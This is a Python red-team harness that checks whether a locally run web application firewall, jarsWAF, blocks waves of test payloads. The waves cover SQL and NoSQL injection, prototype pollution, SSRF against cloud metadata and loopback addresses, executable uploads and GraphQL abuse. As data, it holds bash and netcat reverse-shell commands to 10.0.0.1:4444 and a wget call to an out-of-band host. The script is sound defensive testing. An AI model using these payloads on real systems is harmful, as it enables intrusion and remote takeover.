#!/usr/bin/env python3
"""
jarsWAF Red Team Cycle 5 — Comprehensive Real Live Attack Harness with Per-Wave Isolation.
Evaluates 100% real live proxy traffic against jarsWAF on localhost.
Resets blocklist state before each wave to eliminate Rate Limit / IP Auto-Ban cascading interference.
"""

import http.client
import json
import re
import sys
import time
import urllib.parse

WAF_HOST = "127.0.0.1"
WAF_PORT = 8000
VHOST = "test.jarswafwaf.demo"
BACKEND_MARKER = '"backend": "echo"'
BLOCKLIST_FILE = "blocklist.json"

CHROME_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
SEC_CH_UA = '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"'

BASE_HEADERS = {
    "Host": VHOST,
    "User-Agent": CHROME_UA,
    "Sec-CH-UA": SEC_CH_UA,
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Connection": "close",
}

results = []
blocked_rules = {}


def reset_blocklist():
    """Clear WAF blocklist file to guarantee wave isolation."""
    try:
        with open(BLOCKLIST_FILE, "w") as f:
            f.write("[]")
    except Exception:
        pass


def req(method, path_query, body=None, headers=None):
    hdrs = dict(BASE_HEADERS)
    if headers:
        hdrs.update(headers)
    path_query = re.sub(r"[\x00-\x20\x7f]", lambda m: urllib.parse.quote(m.group(0)), path_query)
    try:
        conn = http.client.HTTPConnection(WAF_HOST, WAF_PORT, timeout=8)
        conn.request(method, path_query, body=body, headers=hdrs)
        resp = conn.getresponse()
        status = resp.status
        resp_headers = dict(resp.getheaders())
        data = resp.read(4000).decode("utf-8", "replace")
        conn.close()
        return status, resp_headers, data
    except Exception as e:
        return 0, {}, str(e)


def classify(status, resp_headers, data, expect_pass=False):
    reached_backend = BACKEND_MARKER in data
    m = re.search(r"([A-Z][A-Z0-9-]{2,25}-\d{3}|[A-Z0-9_-]{4,30})", data)
    rule_hint = m.group(1) if m else ""

    if expect_pass:
        if status == 200 and reached_backend:
            return "PASS_OK", status, "BACKEND_REACHED"
        return "PASS_FAIL", status, f"BLOCKED({rule_hint or status})"
    else:
        if not reached_backend and status in (403, 400, 401, 429, 413, 500, 502, 503):
            if rule_hint:
                blocked_rules[rule_hint] = blocked_rules.get(rule_hint, 0) + 1
            return "BLOCKED", status, rule_hint or f"HTTP_{status}"
        if reached_backend:
            return "BYPASS", status, "UNCHECKED_PASSED"
        return f"UNKNOWN_{status}", status, rule_hint


def run_wave(name, test_cases, method="GET", is_body=False, default_headers=None, expect_pass=False):
    reset_blocklist()
    time.sleep(0.3)
    print(f"\n{'='*75}\nWAVE: {name} ({len(test_cases)} cases)\n{'='*75}")

    wave_results = []
    for tc in test_cases:
        if is_body:
            body_str, label = tc if isinstance(tc, tuple) else (tc, str(tc)[:40])
            st, hdrs, txt = req(method, "/api/v1/resource", body=body_str, headers=default_headers or {"Content-Type": "application/json"})
            show = label
        else:
            path, label = tc if isinstance(tc, tuple) else (tc, tc[:80])
            st, hdrs, txt = req(method, path, headers=default_headers)
            show = label

        verdict, st_code, rule_info = classify(st, hdrs, txt, expect_pass=expect_pass)
        wave_results.append((show, verdict, st_code, rule_info, hdrs))

        if expect_pass:
            icon = "✅ PASS" if verdict == "PASS_OK" else "❌ FALSE_POSITIVE"
        else:
            icon = "🟢 BYPASS (UNSAFE)" if verdict == "BYPASS" else ("🔴 BLOCK (SAFE)" if verdict == "BLOCKED" else "🟡 WARN")

        print(f"  {icon:22} {st_code} [{rule_info:20}] {show}")

    results.extend(wave_results)
    return wave_results


def main():
    print("🚀 STARTING REAL LIVE RED TEAM CYCLE 5 HARNESS...")

    # 1. CANARY TOKEN FAST-PATH (Must PASS 200)
    run_wave(
        "1. Canary Tripwires (Must PASS to Backend)",
        [
            ("/canarytoken/test1234", "Path Canary Token"),
            ("/api/v1/test?canarytoken=abc", "Query Canary Token"),
            ("/nest/canary/active", "Nest Canary Path"),
        ],
        expect_pass=True,
    )

    # 2. NOSQL INJECTION
    run_wave(
        "2. NoSQL Injection (MongoDB Operators)",
        [
            ('{"username":{"$ne":null},"password":{"$ne":null}}', "NoSQL $ne auth bypass"),
            ('{"q":{"$regex":".*"}}', "NoSQL $regex wildcard"),
            ('{"$where":"this.password.length > 0"}', "NoSQL $where JS injection"),
            ('{"$or":[{"a":1},{"b":1}]}', "NoSQL $or operator"),
        ],
        method="POST",
        is_body=True,
    )

    # 3. PROTOTYPE POLLUTION
    run_wave(
        "3. Prototype Pollution",
        [
            ('{"__proto__":{"isAdmin":true}}', "JSON __proto__ pollution"),
            ('{"constructor":{"prototype":{"isAdmin":true}}}', "JSON constructor.prototype"),
            ('/api/users?__proto__[isAdmin]=true', "URI __proto__ query param"),
        ],
        method="POST",
        is_body=True,
    )

    # 4. SQL INJECTION (AST & Tautologies)
    run_wave(
        "4. SQL Injection (AST & Semantic)",
        [
            ("/?id=1' OR '1'='1'--", "SQLi Tautology with comment"),
            ("/?id=(1)OR(1)=(1)", "SQLi Whitespace-less Tautology"),
            ("/?id=1' /*!50000UNION SELECT*/--", "SQLi MySQL Conditional Comment"),
            ("/?id=1' collate nocase = '1'--", "SQLi COLLATE NOCASE"),
        ],
    )

    # 5. COMMAND INJECTION & REVERSE SHELLS
    run_wave(
        "5. Command Injection & Reverse Shells",
        [
            ('{"cmd":"wget http://oastify.com/x"}', "CMDI Out-of-Band OASTIFY"),
            ('{"cmd":"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}', "Reverse Shell Bash TCP"),
            ('{"cmd":"python -c \'import socket,subprocess,os;s=socket.socket()...\'"}', "Reverse Shell Python"),
            ('{"cmd":"nc -e /bin/sh 10.0.0.1 4444"}', "Reverse Shell Netcat -e"),
        ],
        method="POST",
        is_body=True,
    )

    # 6. SSRF PROTECTIONS
    run_wave(
        "6. SSRF Protections (Cloud Metadata & Loopback)",
        [
            ("/?url=http://169.254.169.254/latest/meta-data/", "AWS Cloud Metadata IP"),
            ("/?url=http://127.0.0.1.nip.io/admin", "DNS Rebinding Loopback nip.io"),
            ("/?url=http://0x7f000001/status", "Obfuscated Hex Loopback"),
            ("/?url=http://0177.0.0.1/metrics", "Obfuscated Octal Loopback"),
        ],
    )

    # 7. MULTIPART & FILE UPLOAD
    run_wave(
        "7. File Upload & Executable Extensions",
        [
            ("/upload?file=shell.php", "PHP Executable Extension"),
            ("/upload?file=webshell.php5", "PHP5 Extension"),
            ("/upload?file=script.phtml", "PHTML Extension"),
            ("/upload?file=avatar.jpg.php", "Double Extension .jpg.php"),
            ("/upload?file=.htaccess", "Apache .htaccess Override"),
        ],
    )

    # 8. GRAPHQL DEPTH & COMPLEXITY
    run_wave(
        "8. GraphQL Depth & Complexity Limits",
        [
            ('{"query":"query { user { posts { comments { author { posts { id } } } } } }"}', "GraphQL Query Depth 6 (Limit 5)"),
            ('{"query":"query { a: user { id } b: user { id } c: user { id } d: user { id } e: user { id } }"}', "GraphQL Aliased Query"),
        ],
        method="POST",
        is_body=True,
        default_headers={"Host": VHOST, "User-Agent": CHROME_UA, "Sec-CH-UA": SEC_CH_UA, "Content-Type": "application/json"},
    )

    # 9. CONTROL SANE REQUESTS (Must PASS 200)
    run_wave(
        "9. Benign Control Requests (Must PASS 200)",
        [
            ("/api/v1/users?page=1&limit=20", "Normal Paginated Search"),
            ("/about-us", "Static About Page"),
            ('/{"name":"John Doe","email":"john@example.com"}', "Normal JSON Payload"),
        ],
        expect_pass=True,
    )

    # 10. SECURITY HEADERS CHECK
    print(f"\n{'='*75}\nWAVE: 10. Security Headers Live Verification\n{'='*75}")
    reset_blocklist()
    st, hdrs, txt = req("GET", "/about-us")
    expected_headers = [
        "content-security-policy",
        "strict-transport-security",
        "x-frame-options",
        "x-content-type-options",
        "referrer-policy",
        "permissions-policy",
        "cross-origin-resource-policy",
        "server",
    ]
    present_headers = 0
    for eh in expected_headers:
        val = hdrs.get(eh) or hdrs.get(eh.title())
        if val:
            present_headers += 1
            print(f"  ✅ {eh:30}: {val[:50]}")
        else:
            print(f"  ❌ {eh:30}: MISSING")

    # 11. TOOL EXCLUSION / WHITELIST BYPASS (OWASP CRS REQUEST-905)
    run_wave(
        "11. Whitelisted Tool Bypass (Googlebot & UptimeRobot)",
        [
            ("/api/v1/health", "Googlebot Verified Crawler"),
            ("/status", "UptimeRobot Monitoring Bot"),
        ],
        expect_pass=True,
        default_headers={"Host": VHOST, "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
    )

    print(f"\n{'='*75}\nRED TEAM HARNESS COMPLETED\n{'='*75}")
    print(f"Security Headers Present: {present_headers}/{len(expected_headers)}")
    print(f"Rule Block Summary: {blocked_rules}")


if __name__ == "__main__":
    main()
